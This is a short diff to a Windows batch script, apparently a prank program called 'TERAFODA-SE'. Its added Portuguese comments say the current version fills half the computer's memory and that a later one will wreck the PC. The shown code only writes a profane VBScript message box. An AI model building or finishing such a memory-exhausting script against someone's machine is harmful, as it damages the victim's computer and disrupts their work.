@@ -1,3 +1,6 @@
+:: Por medidas de segurança, o TERAFODA-SE enche apenas metade da memória
+:: na versão atual. Futuramente ele irá foder o PC de vez; aguarde!!!
+
 @echo on
 
 echo x=msgbox("FOOOOODAAAAA-SEEEEE" ,0, "FODA-SE") >> msgbox.vbs
